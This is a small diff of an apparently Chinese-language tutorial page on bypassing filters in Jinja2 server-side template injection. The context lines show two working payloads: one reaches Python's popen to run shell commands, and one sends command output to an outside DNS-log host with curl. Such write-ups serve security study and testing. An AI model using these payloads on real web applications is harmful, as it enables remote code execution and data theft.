@@ -488,7 +488,7 @@ function sidebar_toggle() {
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure>
 <h3 id="过滤-v4">过滤<code>&#123;&#125;</code></h3>
 <h4 id="DNSLOG外带数据">DNSLOG外带数据</h4>
-<p>用<code>&#123;%%&#125;</code>替代了<code>&#123;&#123;&#125;&#125;`，使用判断语句进行dns外带数据
+<p>用<code>&#123;%%&#125;</code>替代了<code>&#123;&#123;&#125;&#125;`，使用判断语句进行dns外带数据：
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;ssti&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
 
